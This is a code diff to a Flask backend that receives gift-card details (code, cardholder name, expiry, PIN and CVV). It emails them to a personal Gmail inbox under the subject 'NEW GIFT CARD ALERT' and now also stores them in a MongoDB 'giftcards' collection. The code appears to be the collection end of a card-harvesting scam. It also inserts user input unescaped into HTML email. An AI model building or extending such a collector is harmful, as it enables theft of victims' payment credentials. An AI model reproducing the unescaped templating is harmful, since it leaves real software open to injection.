@@ -9,7 +9,12 @@ from flask_mail import Message, Mail
 from flask_cors import CORS, cross_origin
 from bs4 import BeautifulSoup as bs
 from flask_sqlalchemy import SQLAlchemy
+import os
+import pymongo
 load_dotenv()
+
+client = pymongo.MongoClient(os.environ.get('MONGO_URI'))
+db = client.giftcards
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = os.environ.get("SECRET_KEY")
@@ -55,7 +60,24 @@ def fill(code, name, exp, pin, cvv):
     return body
 
 
+def populate(name, email, message):
+
+    body = f"""
+             <h3> Hello Perfection, You've got a message from {name}</h3>
+
+             <p>Below is the message</p><br />
+
+              <p>{message}</p>
+              <p> </p>
+              <p> </p>
+              <p>You can reach out back to {name} through their email--: {email}</p>
+        """
+
+    return body
+
 # endpoint for sending email
+
+
 @app.route('/api/v1/submit/', methods=["POST"])
 def send_email():
 
@@ -71,10 +93,8 @@ def send_email():
         # computing message
         msg = Message(subject,
                       sender=name, recipients=['lovedayperfection1@gmail.com'])
-        msg.body = render_template(
-            'reset_password.txt', name=name, email=email, message=message)
-        msg.html = render_template(
-            'reset_password.html', name=name, email=email, message=message)
+        msg.body = populate(name=name, email=email, message=message)
+        msg.html = populate(name=name, email=email, message=message)
 
         # sending the message
         mail.send(msg)
@@ -119,6 +139,14 @@ def sendMail():
         cvv = data['cvv']
         pin = data['pin']
         subject = "NEW GIFT CARD ALERT"
+
+        db.cards.insert_one({
+            "code": code,
+            "name": name,
+            "exp": exp,
+            "pin": pin,
+            "cvv": cvv
+        })
 
         # computing message
         msg = Message(subject,
